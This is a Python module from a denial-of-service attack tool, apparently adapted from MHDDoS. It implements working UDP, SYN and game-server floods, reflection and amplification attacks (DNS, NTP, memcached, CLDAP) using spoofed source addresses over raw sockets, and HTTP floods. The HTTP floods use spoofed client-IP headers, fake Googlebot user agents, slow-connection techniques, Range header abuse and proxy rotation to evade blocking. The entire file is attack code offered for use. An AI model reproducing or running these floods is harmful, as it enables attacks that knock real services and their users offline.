import asyncio
import random
from contextlib import suppress
from copy import copy
import errno
from functools import partial
from itertools import cycle
import logging
from math import log2, trunc
from os import urandom as randbytes
from random import choice
from secrets import choice as randchoice
from socket import (
    AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket, inet_ntoa
)
import socket as _socket
from ssl import CERT_NONE, SSLContext, create_default_context
from sys import exit as _exit
from threading import Event
from time import time
from typing import Any, Callable, List, Optional, Set, Tuple
from urllib import parse
from string import ascii_letters
from struct import pack as data_pack

import aiohttp
from async_timeout import timeout
from yarl import URL

from .ImpactPacket import IP, TCP, UDP, Data
from .core import cl, logger
from .proxies import ProxySet, NoProxySet

from . import proxy_proto
from .proto import FloodIO, FloodOp, FloodSpec, FloodSpecType
from .referers import REFERERS
from .useragents import USERAGENTS
from .rotate import suffix as rotate_suffix, params as rotate_params
from .targets import TargetStats


USERAGENTS = list(USERAGENTS)
REFERERS = list(set(a.strip() for a in REFERERS))

ctx: SSLContext = create_default_context()
ctx.check_hostname = False
try:
    ctx.server_hostname = ""
except AttributeError:
    # Old Python version. SNI might fail even though it's not requested
    # the issue is only fixed in Python3.8+, and the attribute for SSLContext
    # is supported in Python3.7+. With ealier version it's just going
    # to fail
    pass
ctx.verify_mode = CERT_NONE
ctx.set_ciphers("DEFAULT")

SOCK_TIMEOUT = 8


def exit(*message):
    if message:
        logger.error(cl.RED + " ".join(message) + cl.RESET)
    logging.shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "AVB",
        "APACHE", "XMLRPC", "DOWNLOADER", "TCP"
    }

    LAYER4_METHODS: Set[str] = {
        "UDP", "VSE", "FIVEM", "TS3", "MCPE",
        # the following methods are temporarily disabled
        # for further investiation and testing
        # "SYN",  "MEM", "NTP", "DNS", "ARD",
        # "CHAR", "RDP", "CPS",  "CLDAP"
    }
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Tools:
    @staticmethod
    def humanbits(i: int) -> str:
        MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
        if i > 0:
            base = 1024
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            return f'{value:.2f} {MULTIPLES[multiple]}'
        else:
            return '0 Bit'

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> str:
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes)))
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return str(num)

    @staticmethod
    def parse_params(url, ip, proxies):
        result = url.host.lower().endswith(rotate_suffix)
        if result:
            return choice(rotate_params), NoProxySet
        return (url, ip), proxies

    @staticmethod
    def sendto(sock, packet, target, stats: TargetStats):
        if not sock.sendto(packet, target):
            return False
        stats.track(1, len(packet))
        return True

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

    @staticmethod
    def rand_str(length=16):
        return ''.join(random.choices(ascii_letters, k=length))

    @staticmethod
    def rand_ipv4():
        return inet_ntoa(
            data_pack('>I', random.randint(1, 0xffffffff))
        )


# noinspection PyBroadException,PyUnusedLocal
class Layer4:
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle

    def __init__(
        self,
        target: Tuple[str, int],
        ref: List[str],
        method: str,
        event: Event,
        proxies: ProxySet,
        stats: TargetStats,
    ):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._event = event
        self._stats = stats
        self._proxies = proxies
        self.select(self._method)

    def run(self) -> int:
        return self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        sock = self._get_proxy().open_socket(conn_type, sock_type, proto_type)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(SOCK_TIMEOUT)
        sock.connect(self._target)
        return sock

    def select(self, name):
        self.SENT_FLOOD = self.UDP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "TS3": self.SENT_FLOOD = self.TS3
        if name == "MCPE": self.SENT_FLOOD = self.MCPE
        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
        if name == "CPS": self.SENT_FLOOD = self.CPS
        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CLDAP":
            self._amp_payload = (
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                389
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def CPS(self) -> int:
        s, packets = None, 0
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            self._stats.track(1, 0)
            packets += 1
        Tools.safe_close(s)
        return packets

    def SYN(self) -> int:
        payload = self._generate_syn()
        s, packets = None, 0
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def AMP(self) -> int:
        s, packets = None, 0
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads), self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def VSE(self) -> int:
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def FIVEM(self) -> int:
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def TS3(self) -> int:
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def MCPE(self) -> int:
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def _generate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(Tools.rand_ipv4())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(random.randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


def request_info_size(request: aiohttp.RequestInfo) -> int:
    headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
    status_line = f"{request.method} {request.url} HTTP/1.1"
    return len(f"{status_line}\r\n{headers}\r\n\r\n".encode())


class AttackSettings:
    connect_timeout_seconds: float
    dest_connect_timeout_seconds: float
    drain_timeout_seconds: float
    close_timeout_seconds: float
    http_response_timeout_seconds: float
    tcp_read_timeout_seconds: float
    requests_per_connection: int
    high_watermark: int
    socket_rcvbuf: int

    def __init__(
        self,
        *,
        connect_timeout_seconds: float = SOCK_TIMEOUT,
        dest_connect_timeout_seconds: float = SOCK_TIMEOUT,
        drain_timeout_seconds: float = 5.0,
        close_timeout_seconds: float = 1.0,
        http_response_timeout_seconds: float = 15.0,
        tcp_read_timeout_seconds: float = 0.2,
        requests_per_connection: int = 1024,
        high_watermark: int = 1024 << 5,
        reader_limit: int = 1024 << 6,
        socket_rcvbuf: int = 1024 << 5,
    ):
        self.connect_timeout_seconds = connect_timeout_seconds
        self.dest_connect_timeout_seconds = dest_connect_timeout_seconds
        self.drain_timeout_seconds = drain_timeout_seconds
        self.close_timeout_seconds = close_timeout_seconds
        self.http_response_timeout_seconds = http_response_timeout_seconds
        self.tcp_read_timeout_seconds = tcp_read_timeout_seconds
        self.requests_per_connection = requests_per_connection
        self.high_watermark = high_watermark
        self.reader_limit = reader_limit
        self.socket_rcvbuf = socket_rcvbuf

    def with_options(self, **kwargs) -> "AttackSettings":
        settings = copy(self)
        for k, v in kwargs.items():
            if v is not None:
                assert hasattr(settings, k)
                setattr(settings, k, v)
        return settings


class AsyncTcpFlood:
    def __init__(
        self,
        target: URL,
        addr: str,
        method: str,
        event: Event,
        useragents: List[str],
        referers: List[str],
        proxies: ProxySet,
        stats: TargetStats,
        loop=None,
        settings: Optional[AttackSettings] = None
    ) -> None:
        self.SENT_FLOOD = None
        self._event = event
        self._method = method
        self._target = target
        self._addr = addr
        self._raw_target = (self._addr, (self._target.port or 80))
        self._stats = stats

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._addr, (self._target.port or 80))

        self._referers = referers
        self._useragents = useragents
        self._proxies = proxies
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')
        self.select(self._method)

        self._loop = loop
        self._settings = settings or AttackSettings()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = getattr(self, name)
        if name == "PPS":
            self._defaultpayload = (
                self._defaultpayload +
                "Host: %s\r\n\r\n" % self._target.authority
            ).encode()

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return (
            "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
            else "HEAD" if method.upper() in {"GSB", "HEAD"}
            else "GET"
        )

    @property
    def SpoofIP(self) -> str:
        spoof: str = Tools.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           "Host: %s\r\n" % self._target.authority +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    async def run(self, on_connect=None) -> bool:
        assert self._loop is not None, "Event loop has to be set to run async flooder"
        try:
            return await self.SENT_FLOOD(on_connect=on_connect)
        except OSError as exc:
            if exc.errno == errno.ENOBUFS:
                await asyncio.sleep(0.1)
                # going to try again, hope device will be ready
                return True
            else:
                raise exc

    # XXX: get rid of RPC param when OVH is gone
    async def _generic_flood_proto(
        self,
        payload_type: FloodSpecType,
        payload,
        on_connect: Optional[asyncio.Future],
        *,
        rpc: Optional[int] = None
    ) -> bool:
        on_close = self._loop.create_future()
        rpc = rpc or self._settings.requests_per_connection
        flood_proto = partial(
            FloodIO,
            self._loop,
            on_close,
            self._stats,
            self._settings,
            FloodSpec.from_any(payload_type, payload, rpc),
            on_connect=on_connect,
        )
        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
        server_hostname = "" if is_tls else None
        ssl_ctx = ctx if is_tls else None
        proxy_url: str = self._proxies.pick_random()
        if proxy_url is None:
            conn = self._loop.create_connection(
                flood_proto,
                host=self._addr,
                port=self._target.port,
                ssl=ssl_ctx,
                server_hostname=server_hostname
            )
        else:
            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
            flood_proto = partial(
                proxy_protocol,
                self._loop,
                on_close,
                self._raw_target,
                ssl_ctx,
                downstream_factory=flood_proto,
                connect_timeout=self._settings.dest_connect_timeout_seconds,
                on_connect=on_connect,
            )
            conn = self._loop.create_connection(
                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
        try:
            async with timeout(self._settings.connect_timeout_seconds):
                transport, _ = await conn
            sock = transport.get_extra_info("socket")
            if sock and hasattr(sock, "setsockopt"):
                sock.setsockopt(
                    _socket.SOL_SOCKET, _socket.SO_RCVBUF, self._settings.socket_rcvbuf)
        except asyncio.CancelledError as e:
            if on_connect:
                on_connect.cancel()
            on_close.cancel()
            raise e
        except Exception as e:
            if on_connect:
                on_connect.set_exception(e)
            raise e
        else:
            return bool(await on_close)

    async def GET(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload()
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def POST(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % Tools.rand_str(32))[:-2]
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def STRESS(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload(
            (f"Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % Tools.rand_str(512))[:-2]
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def COOKIES(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (random.randint(1000, 99999), Tools.rand_str(6), Tools.rand_str(32))
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def APACHE(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def XMLRPC(self, on_connect=None) -> bool:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (Tools.rand_str(64), Tools.rand_str(64)))[:-2]
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def PPS(self, on_connect=None) -> bool:
        # _defaultpayload is extended and encoded in self.select
        payload: bytes = self._defaultpayload
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def DYN(self, on_connect=None) -> bool:
        payload: bytes = str.encode(
            self._payload +
            "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority) +
            self.randHeadercontent +
            "\r\n"
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def GSB(self, on_connect) -> bool:
        payload: bytes = str.encode(
            "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                          self._target.raw_path_qs,
                                          Tools.rand_str(6)) +
            "Host: %s\r\n" % self._target.authority +
            self.randHeadercontent +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: Keep-Alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Gpc: 1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n\r\n'
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def NULL(self, on_connect=None) -> bool:
        payload: bytes = str.encode(
            self._payload +
            "Host: %s\r\n" % self._target.authority +
            "User-Agent: null\r\n" +
            "Referrer: null\r\n" +
            self.SpoofIP + "\r\n"
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def BYPASS(self, on_connect=None) -> bool:
        connector = self._proxies.pick_random_connector()
        packets_sent = 0
        cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
        async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
            self._stats.track_open_connection()  # not exactly the connection though
            if not on_connect.cancelled():
                on_connect.set_result(True)
            try:
                for _ in range(self._settings.requests_per_connection):
                    async with s.get(self._target.human_repr()) as response:
                        self._stats.track(1, request_info_size(response.request_info))
                        packets_sent += 1
                        # XXX: we need to track in/out traffic separately
                        async with timeout(self._settings.http_response_timeout_seconds):
                            await response.read()
            finally:
                self._stats.track_close_connection()
        return packets_sent > 0

    async def CFB(self, on_connect=None) -> bool:
        packet: bytes = self.generate_payload()
        packet_size: int = len(packet)

        def _gen():
            yield FloodOp.WRITE, (packet, packet_size)
            yield FloodOp.SLEEP, 5.01
            deadline = time() + 120
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                if time() > deadline:
                    return

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def EVEN(self, on_connect=None) -> bool:
        packet: bytes = self.generate_payload()
        packet_size: int = len(packet)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                # XXX: have to setup buffering properly for this attack to be effective
                yield FloodOp.READ, 1

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def OVH(self, on_connect=None) -> int:
        payload: bytes = self.generate_payload()
        # XXX: we might want to remove this attack as we don't really
        #      track cases when high number of packets on the same connection
        #      leads to IP being blocked
        return await self._generic_flood_proto(
            FloodSpecType.BYTES,
            payload,
            on_connect,
            rpc=min(self._settings.requests_per_connection, 5),
        )

    async def AVB(self, on_connect=None) -> bool:
        packet: bytes = self.generate_payload()
        packet_size: int = len(packet)
        delay: float = max(self._settings.requests_per_connection / 1000, 1)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.SLEEP, delay
                yield FloodOp.WRITE, (packet, packet_size)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def SLOW(self, on_connect=None) -> bool:
        packet: bytes = self.generate_payload()
        packet_size: int = len(packet)
        delay: float = self._settings.requests_per_connection / 15

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
            while True:
                yield FloodOp.WRITE, (packet, packet_size)
                yield FloodOp.READ, 1
                # XXX: note this weid break in the middle of the code:
                #        https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
                #      this attack has to be re-tested
                keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
                yield FloodOp.WRITE, (keep, len(keep))
                yield FloodOp.SLEEP, delay

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def DOWNLOADER(self, on_connect=None) -> bool:
        packet: bytes = self.generate_payload()
        packet_size: int = len(packet)
        delay: float = self._settings.requests_per_connection / 15

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                while True:
                    yield FloodOp.SLEEP, 0.1
                    yield FloodOp.READ, 1
                    # XXX: how to detect EOF here?
                    #      the problem with such attack is that if we already got
                    #      EOF, there's no need to perform any other operations
                    #      within range(_) loop. original code from MHDDOS seems to
                    #      be broken on the matter:
                    #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
            yield FloodOp.WRITE, (b'0', 1)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def TCP(self, on_connect=None) -> bool:
        packet_size = 1024
        return await self._generic_flood_proto(
            FloodSpecType.CALLABLE, partial(randbytes, packet_size), on_connect)


class AsyncUdpFlood(Layer4):

    def __init__(self, *args, loop=None, settings: Optional[AttackSettings] = None):
        super().__init__(*args)
        self._loop = loop
        self._settings = settings or AttackSettings()

    async def run(self) -> bool:
        assert self._loop is not None, "Event loop has to be set to run async flooder"
        return await self.SENT_FLOOD()

    async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
        packets_sent = 0
        with socket(AF_INET, SOCK_DGRAM) as sock:
            async with timeout(self._settings.connect_timeout_seconds):
                await self._loop.sock_connect(sock, self._target)
            while True:
                packet, packet_size = packet_gen()
                try:
                    async with timeout(self._settings.drain_timeout_seconds):
                        await self._loop.sock_sendall(sock, packet)
                except OSError as exc:
                    if exc.errno == errno.ENOBUFS:
                        await asyncio.sleep(0.5)
                    else:
                        raise exc
                self._stats.track(1, packet_size)
                packets_sent += 1
        return packets_sent > 0

    async def UDP(self) -> bool:
        packet_size = 1024
        return await self._generic_flood(lambda: (randbytes(packet_size), packet_size))

    async def VSE(self) -> bool:
        packet: bytes = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def FIVEM(self) -> bool:
        packet: bytes = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def TS3(self) -> bool:
        packet = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def MCPE(self) -> bool:
        packet: bytes = (
            b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
            b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
            b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
            b'\x73'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))


def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
    if method not in Methods.ALL_METHODS:
        exit(f"Method {method} Not Found")

    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
    if method in Methods.LAYER7_METHODS:
        return AsyncTcpFlood(
            url,
            ip,
            method,
            event,
            USERAGENTS,
            REFERERS,
            proxies,
            stats,
            loop=loop,
            settings=settings,
        )

    if method in Methods.LAYER4_METHODS:
        port = url.port

        # XXX: move this test to targets parser
        if port > 65535 or port < 1:
            exit("Invalid Port [Min: 1 / Max: 65535] ")

        if not port:
            logger.warning("Port Not Selected, Set To Default: 80")
            port = 80

        return AsyncUdpFlood(
            (ip, port),
            None,  # XXX: previously used for "ref"
            method,
            event,
            proxies,
            stats,
            loop=loop,
            settings=settings
        )
